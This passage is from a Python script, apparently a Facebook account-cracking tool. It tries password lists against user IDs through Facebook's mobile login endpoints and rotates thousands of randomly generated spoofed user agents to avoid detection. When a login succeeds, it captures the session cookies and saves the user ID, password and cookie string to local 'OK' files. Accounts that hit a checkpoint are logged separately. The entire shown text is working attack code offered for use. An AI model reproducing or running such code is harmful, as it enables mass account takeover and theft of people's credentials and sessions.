				cp+=1
				print (f'\r{P} └── {K}{uid} ◊ {pw}  \n{P} └─ {U}{ua} \n ')
				open('CP/'+waktu,'a').write(uid+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(20)
	loop+=1


#----->( metod 4 )
def Validate3(uid,pwx):
	global loop, ok, cp
	komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
	print (f"\r {komtol}• {P}{(loop)}/{len(id)} - {H}OK:-{ok} {K}CP:-{cp}   ",end="")
	ses = requests.Session()
	for pwz in sandi:
		try:
			ua = random.choice(ugen)
			ua = random.choice(ugen2)
			link = ses.get(f'https://free.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&refsrc=deprecated&_rdr')
			data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
				"uid":uid,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pwz,}
			heade = {
				'Host': 'm.facebook.com', 
				'viewport-width': '980', 
				'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 
				'sec-ch-ua-mobile': '?1', 
				'sec-ch-ua-platform':'"Android"', 
				'sec-ch-prefers-color-scheme': 
				'light', 'dnt': '1', 
				'upgrade-insecure-requests': '1', 
				'user-agent': ua, 
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
				'sec-fetch-site': 'same-origin', 
				'sec-fetch-mode': 'navigate', 
				'sec-fetch-user': '?1', 
				'sec-fetch-dest': 'document', 
				'accept-encoding': 'gzip, deflate, br', 
				'accept-language': 'en-US,en;q=0.9'}
			post = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=data, headers=heade, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				print(f'\r{P} └──{H} {uid} ◊ {pw} \n{P} └─ {H}{kuki} \n{P} └─ {U}{ua} \n ')
				open('OK/'+waktu,'a').write(uid+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				print (f'\r{P} └── {K}{uid} ◊ {pw}  \n{P} └─ {U}{ua} \n ')
				open('CP/'+waktu,'a').write(uid+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(20)
	loop+=1
	

class crack:
	#--- USER AGENT
	def UA(self):
		try:
			uas = open('ugent.txt','r').read()
		except (FileNotFoundError,IOError):
			uas = ("Mozilla/5.0 (Linux; Android 4.4.2; BQS-4007 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36")
			open('ugent.txt','w').write(uas)
		
		return uas 
			
	def user_agentAPI(self):
		ugent =[
			"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 11; RMX3501 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]",
			"Mozilla/5.0 (Linux; Android 12; RMX3521 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/390.0.0.27.105;]",
			"Mozilla/5.0 (Linux; Android 12; RMX2111 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/390.2.0.29.103;]",
			"Mozilla/5.0 (Linux; Android 12; AC2003 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]",
			"Mozilla/5.0 (Linux; Android 5.0.1; GT-I9500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 7.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"
			"Mozilla/5.0 (Linux; U; Android 12; en-US; SM-A2829J) AppleWebKit/537.36 (KHTML, like Gecko)  UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 10; Pixel Build/QP1A.190711.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]",
			"Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3396.81 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12",
			"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36","Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36","Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE5-00/071.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.26 Mobile Safari/533.4 3gpp-gba",
			"Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
			"[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]",
			"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
			"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)","Mozilla/5.0 (Series40; Nokia501/1.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.0.0.0.67",
			"Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4","Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11",
			"Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaE7-00/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1","Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5230/51.0.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", 
			"Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaC6-01/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1", "Mozilla/5.0 (Series40; Nokia205.1/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", 
			"Mozilla/5.0 (Series40; Nokia303/14.87; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Symbian/3; Series60/5.3 Nokia500/111.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1","Mozilla/5.0 (Series40; Nokia110/03.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.62.10",
			"Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia205/03.18; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45","Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaC5-06/23.6.015; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", 
			"Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia208/03.39; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45","Mozilla/5.0 (Series40; Nokia2700c-2/07.80; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45",
			"Mozilla/5.0 (Series40; Nokia205/03.19; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45",  "Mozilla/5.0 (Series40; Nokia205.1/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia201/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.68.14",
		]
		rand_ua = random.choice(ugent)
		return rand_ua 


ugen, ugen2 = [], []
for apa in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaN8-00/012.002;'
    e=random.randrange(100, 9999)
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku) 
    aa='Mozilla/5.0 (X11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Linux x86_64)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)


if __name__=="__main__":
	#os.system("clear")
	#os.system("git pull")
	try:os.mkdir('data')
	except:pass 
	try:os.mkdir('CP')
	except:pass 
	try:os.mkdir('OK')
	except:pass 
	menu()
